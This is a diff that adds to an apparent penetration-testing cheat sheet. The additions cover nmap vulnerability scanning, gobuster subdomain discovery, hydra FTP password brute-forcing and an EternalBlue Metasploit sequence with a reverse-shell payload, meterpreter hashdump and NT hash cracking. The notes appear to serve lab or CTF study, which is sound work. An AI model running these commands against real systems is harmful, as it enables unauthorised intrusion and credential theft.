@@ -90,6 +90,15 @@ Examples:
 - `nmap -sV -Pn IP/range`
 - `nmap -sP IP/range`
 - `nmap -sS -sV -O 172.20.0.*`
+- `nmap -sS -sV -sC -A -O 172.20.0.*`
+- `nmap --script vuln 172.20.0.*`
+- `nmap -vv -T4 -A -oN ff.txt 10.10.183.* -p8012`
+
+| **Option** | **Description**                                                                 |
+|------------|---------------------------------------------------------------------------------|
+| `-A`       | Enables OS detection, version detection, script scanning, and traceroute        |
+| `-oN`      | Output to a file (e.g., `telnetnmap` for this task; you can name it anything)    |
+| `-p 8012`  | Specifying the port                                                             |
 
 > Netdiscover
 - `netdiscover -r range`
@@ -109,6 +118,8 @@ Examples:
 
 > Angry IP Scanner (Windows)
 * Type the IP range > Click the preferences icon > In the scanning tab, select the pining method as combined UDP+TCP > In the display tab, select the alive hosts > OK > Start
+
+
 
 
 ## <span style="color: #3498db; font-size: 0.8em;">Find Domains and Subdomains</span>
@@ -152,6 +163,11 @@ Examples:
 - `gobuster dns -d mysite.com -t 50 -w common-names.txt`
 - `gobuster dir -u https://mysite.com/path/to/folder -c 'session=123456' -t 50 -w common-files.txt -x .php,.html`
 - `gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt`
+- Find subdomains: `gobuster vhost  -u https://futurevera.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -k --append-domain`
+
+>host
+- Find ip domain:
+`host www.ceh.com`
 
 >Sublist3r
 - `python sublist3r.py -d example.com`
@@ -717,6 +733,10 @@ Is a tool for enumerating information from Windows and Samba systems. It is used
  >Telnet
 - `telnet IP port`
 
+- `sudo tcpdump ip proto \\icmp -i tun0`
+ 
+
+
  >Connect
 - `ftp user@IP`
 - `ftp IP`
@@ -725,6 +745,18 @@ Is a tool for enumerating information from Windows and Samba systems. It is used
 
 >Cracking credentials
 - `hydra -L wordlistsUsers -P wordlistsPass ftp://IP`
+- `hydra -l User  -P /usr/share/wordlists/rockyou.txt IP ftp`
+
+
+| **SECTION**           | **FUNCTION**                                                                 |
+|-----------------------|-------------------------------------------------------------------------------|
+| `hydra`               | Runs the hydra tool                                                           |
+| `-t 4`                | Number of parallel connections per target                                     |
+| `-l [user]`           | Points to the user whose account you're trying to compromise                  |
+| `-P [path to dictionary]` | Points to the file containing the list of possible passwords              |
+| `-vV`                 | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
+| `[machine IP]`        | The IP address of the target machine                                          |
+| `ftp / protocol`      | Sets the protocol                                                             |
 
 
 ## <span style="color: #3498db; font-size: 0.8em;"> SSH</span>
@@ -2051,6 +2083,24 @@ Notes:
 * DDoS in Wireshark: then >statistics > ipv4 statistics > destination and ports
 * Find a file in Android: adb shell ls -R | grep filename
 
+
+
+## <span style="color: #3498db; font-size: 0.8em;">   ETERNAL BLUE</span>
+
+- `nmap -sC -sV -A -O IP`
+- `nmap --script vuln IP`
+- `sudo msfconsole`
+- `search xploitms`
+- `set payload windows/x64/shell/reverse_tcp`
+- `search shell_to_meterpreter`
+- `sessions -i #`
+- `getuid`
+- `hashdump`
+- `migrate`
+- `hashdump`
+- `save hash`
+- `john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=NT`
+- `search -f text*`
 
 
 Interesting URL:
